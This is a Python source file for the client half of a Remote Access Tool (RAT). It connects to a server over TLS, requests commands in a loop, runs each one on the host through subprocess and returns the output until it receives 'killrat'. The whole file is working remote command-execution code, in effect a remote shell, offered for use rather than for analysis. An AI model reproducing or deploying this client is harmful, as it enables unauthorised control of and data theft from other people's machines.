"""
Python Remote Access Tool(RAT) Client

This client requests commands from a server and executes them on the machine. All traffic is encrypted with TLS.
"""
import os
import subprocess
import socket
import ssl

class CLIENT:
    """
    Client object

    Requests tasks from the RAT server and executes them on the machine.
    
    Attributes:
        host : str
            IP address of the client
        port : int
            Port of the client
        command: str
            Current command
    
    Methods:
        make_connection()
            Connect to the server
        execute()
            Request commands from the server and run them
    """
    def __init__(self, host, port):
        """
        Initialization function for the client object

        Host and Port can be configured when the object is initialized

        Parameters:
            host : str
                IP address of client
            port : int
                Port of client

        """
        self.host = host
        self.port = port
        self.command = ""

    def make_connection(self, server_host, server_port):
        """
        Connect client and server.

        Connects the client to the server using the TLS certs that are declared as keyfile and certfile. Default certs for testing can be found in the main directory of the project.

        Parameters:
            server_host : str
                IP of the server to connect to
            server_port : int
                Port of the server to connect to

        """
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock = ssl.wrap_socket(sock, keyfile="privkey.pem", certfile="certficate.pem") #If you want to use other cert files, you can change the path to your private key and cert here.

        sock.bind((self.host, self.port))
        sock.connect((server_host, server_port))

    def execute(self):
        """
        Run commands from server.

        Unless the command is killrat, which will close the program, the command from the server is run. This is not perfect, as subprocess (which is used to run the commands on the machine) is
        very limited in its ability so most useful commands need to be added manually as if statements and take advantage of the os library. The actual communication between client and server looks similar to
        a TCP handshake, with the client sending a request for a command if it doesn't currently have one, and then the server responding with the command, the client runs it and responds with the results, and
        the server acknowledges the results (and lets the server know it has had time to store it in the db and show it to the user) and then sends the client an acknowledgement which lets the client start
        the process over again. 
        
        """
        while True:
            if self.command == "killrat": #Kill command
                break  
            if self.command != "": #If the client already has a command
                try:
                    result = subprocess.getoutput(self.command) #Run command on machine
                    sock.send(result.encode())
                except:
                    result = "Failed to run command, subprocess lacks the permissions."
                    sock.send(result.encode())
                 #Send the result to the server
                ack = sock.recv(1024).decode('utf-8')
                if ack == "ack": #Wait for server to acknowledge result before asking for next command
                    self.command = ""
                    print("ack")
            else: #If the client doesn't have a command
                sock.send("get_command".encode("utf-8")) #Send out a request for a command
                while True:
                    self.command = sock.recv(1024).decode('utf-8')
                    print (self.command)
                    break


if __name__ == "__main__":
    client = CLIENT("127.0.0.1", 4444) #Initialize client
    client.make_connection("127.0.0.1", 4445) #Connect to server
    client.execute() #Run the rat